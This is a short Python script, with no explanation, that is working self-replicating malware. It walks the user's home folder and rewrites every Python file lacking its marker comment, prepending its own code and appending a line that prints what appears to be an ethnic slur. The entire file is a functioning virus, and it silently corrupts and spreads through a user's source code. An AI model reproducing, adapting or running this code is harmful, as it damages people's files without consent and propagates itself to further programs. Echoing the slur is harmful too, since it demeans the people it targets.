# qwertyui
import os, sys
SELF_CONTENT = open(sys.argv[0]).read()[:704]
def artgv_folder(path, level):
    files = os.listdir(path)
    for i in files:
        j = f"{path}/{i}"
        if os.path.isdir(j) and level < 2:
            artgv_folder(j, level+1)
        if j.split(".")[-1] == "py":
            try:
                content = open(j).read()
            except Exception:pass
            if content.split("\n")[0] != "# qwertyui":
                try:
                    with open(j, "w") as handle:
                        handle.write(f"{SELF_CONTENT}\n\n\n{content}\nprint('negry')")
                except Exception:
                    pass
artgv_folder("/home/user", 1)
print('negry')
